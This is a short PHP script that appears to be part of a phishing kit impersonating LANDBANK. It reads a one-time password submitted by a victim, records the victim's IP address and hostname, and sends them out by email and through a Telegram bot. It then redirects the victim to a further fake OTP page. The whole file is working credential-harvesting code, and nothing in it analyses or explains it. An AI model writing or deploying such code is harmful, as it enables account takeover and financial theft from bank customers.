<?php
include 'teleg.php';
$ip = getenv("REMOTE_ADDR");
date_default_timezone_set("Asia/Manila");
$date = gmdate ("Y/m/d");
$dateHis = gmdate ("H:i:sa");


$msg .= gethostbyaddr($ip) . " - " . $ip;
$msg .= "\n";
$msg .= "-------------------[LANDBANK OTP]-----------------\n";
$msg .= "OTP     : ".$_POST['OTP']."\n";
$msg .= "IP     : ".$ip." @ ".$dateHis."\n";
$msg .= "---------------------[ODIN LIF3]---------------------\n";


$subject = "New SB OTP 1 ".$ontp1."";
$headers = 'From: no-reply@email.com' . "\r\n" .
        'X-Mailer: PHP/' . phpversion();

$to = '';
mail($to, $subject, $msg, $headers);
tgbot($msg);
header("location: otp1.php");
?>